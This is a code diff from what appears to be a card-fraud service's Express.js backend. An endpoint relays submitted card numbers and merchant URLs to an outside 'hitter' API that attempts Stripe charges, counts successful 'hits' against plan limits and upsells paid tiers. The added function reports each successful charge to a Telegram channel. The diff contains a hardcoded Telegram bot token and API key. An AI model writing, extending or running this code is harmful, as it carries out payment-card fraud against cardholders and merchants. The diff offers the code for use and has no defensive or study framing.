@@ -212,66 +212,111 @@ app.post('/verify-otp', (req, res) => {
 });
 
 // Hit Proxy with Limit Checks
+// Telegram Notification Helper (Server-side)
+async function sendHitNotification(card, res, gate, userPlan) {
+    const NOTIFY_BOT_TOKEN = '8680374467:AAEcO6m-O6BOQD0mec7cyURfqQ8Ax2bphkk';
+    const NOTIFY_CHAT_ID = '-1003721268860';
+
+    const gatewayMap = {
+        'checkout': 'Stripe Checkout Hitter',
+        'invoice': 'Stripe Invoice Hitter',
+        'billing': 'Stripe Billing Hitter'
+    };
+    const gateway = gatewayMap[gate] || 'Stripe Hitter';
+
+    const parts = card.split('|');
+    const num = parts[0];
+    const masked = num.length > 10 ? `${num.substring(0, 6)}******${num.substring(num.length - 4)}|${parts[1]}|${parts[2]}|${parts[3]}` : card;
+
+    const message = `
+🔥 <b>HIT DETECTED</b> ⚡
+💳 <b>Card</b>: <code>${masked}</code>
+👤 <b>Plan</b>: ${userPlan.toUpperCase()}
+↔️ <b>Gateway</b>: ${gateway}
+✅ <b>Response</b>: Charged Successfully
+🌐 <b>Site</b>: ${res.site || 'Unknown'}
+💰 <b>Amount</b>: ${res.amount || 'Unknown'}
+`.trim();
+
+    try {
+        await axios.post(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
+            chat_id: NOTIFY_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML',
+            disable_web_page_preview: true,
+            reply_markup: {
+                inline_keyboard: [[{ text: "Open HIT Checker", url: "https://t.me/autohittrobot" }]]
+            }
+        });
+        console.log(`[Notification] Success sent for ${masked}`);
+    } catch (err) {
+        console.error('[Notification] Failed:', err.message);
+    }
+}
+
+// Hit Proxy with Limit Checks
 app.post('/hit-proxy/:gate', async (req, res) => {
-  const { gate } = req.params;
-  const { chatId, card, url } = req.body;
+    const { gate } = req.params;
+    const { chatId, card, url } = req.body;
 
-  if (!chatId || !card || !url) {
-    return res.status(400).json({ error: 'Missing parameters (chatId, card, or url)' });
-  }
-
-  const db = readDB();
-  const user = db.users[chatId];
-
-  if (!user) {
-    return res.status(403).json({ error: 'User not registered. Please login.' });
-  }
-
-  checkDailyReset(user);
-  checkPlanExpiry(user);
-
-  // Enforce Limit for Free Plan
-  if (user.plan === 'free' && user.hits_today >= 2) {
-    return res.status(403).json({ 
-      error: 'Limit Reached', 
-      message: 'You have reached your daily limit of 2 hits. Upgrade to Silver/Gold for unlimited access!' 
-    });
-  }
-
-  try {
-    // UPDATED API KEY from your app.js
-    const API_KEY = 'hitchk_e03920c069910b8939f63f77897e1f0ff463f60f8b623f06';
-    const API_URL = 'https://hitter1month.replit.app';
-
-    const response = await axios.post(`${API_URL}/hit/${gate}`, {
-        url,
-        card
-    }, {
-        headers: { 'X-API-Key': API_KEY, 'Content-Type': 'application/json' },
-        timeout: 120000
-    });
-
-    const result = response.data;
-    const status = (result.status || '').toLowerCase();
-
-    // ONLY update Hit Count if the card was successfully CHARGED or APPROVED
-    if (status === 'charged' || status === 'approved') {
-        user.hits_today++;
-        writeDB(db);
-        console.log(`[Limit] Hit successful for ${chatId}. Hits today: ${user.hits_today}`);
-    } else {
-        console.log(`[Limit] Hit declined for ${chatId}. Limit not deducted.`);
+    if (!chatId || !card || !url) {
+        return res.status(400).json({ error: 'Missing parameters (chatId, card, or url)' });
     }
 
-    res.json({
-      ...result,
-      remainingHits: user.plan === 'free' ? (2 - user.hits_today) : 'Unlimited'
-    });
+    const db = readDB();
+    const user = db.users[chatId];
 
-  } catch (err) {
-    console.error('Hit Failed:', err.message);
-    res.status(500).json({ error: 'System Error', message: err.message });
-  }
+    if (!user) {
+        return res.status(403).json({ error: 'User not registered. Please login.' });
+    }
+
+    checkDailyReset(user);
+    checkPlanExpiry(user);
+
+    // Enforce Limit for Free Plan
+    if (user.plan === 'free' && user.hits_today >= 2) {
+        return res.status(403).json({
+            error: 'Limit Reached',
+            message: 'You have reached your daily limit of 2 hits. Upgrade to Silver/Gold for unlimited access!'
+        });
+    }
+
+    try {
+        const API_KEY = 'hitchk_e03920c069910b8939f63f77897e1f0ff463f60f8b623f06';
+        const API_URL = 'https://hitter1month.replit.app';
+
+        const response = await axios.post(`${API_URL}/hit/${gate}`, {
+            url,
+            card
+        }, {
+            headers: { 'X-API-Key': API_KEY, 'Content-Type': 'application/json' },
+            timeout: 120000
+        });
+
+        const result = response.data;
+        const status = (result.status || '').toLowerCase();
+
+        // ONLY update Hit Count if the card was successfully CHARGED or APPROVED
+        if (status === 'charged' || status === 'approved') {
+            user.hits_today++;
+            writeDB(db);
+            console.log(`[Limit] Hit successful for ${chatId}. Hits today: ${user.hits_today}`);
+
+            // SEND NOTIFICATION FROM SERVER
+            sendHitNotification(card, result, gate, user.plan);
+        } else {
+            console.log(`[Limit] Hit declined for ${chatId}. Limit not deducted.`);
+        }
+
+        res.json({
+            ...result,
+            remainingHits: user.plan === 'free' ? (2 - user.hits_today) : 'Unlimited'
+        });
+
+    } catch (err) {
+        console.error('Hit Failed:', err.message);
+        res.status(500).json({ error: 'System Error', message: err.message });
+    }
 });
 
 // Redeem Code Endpoint
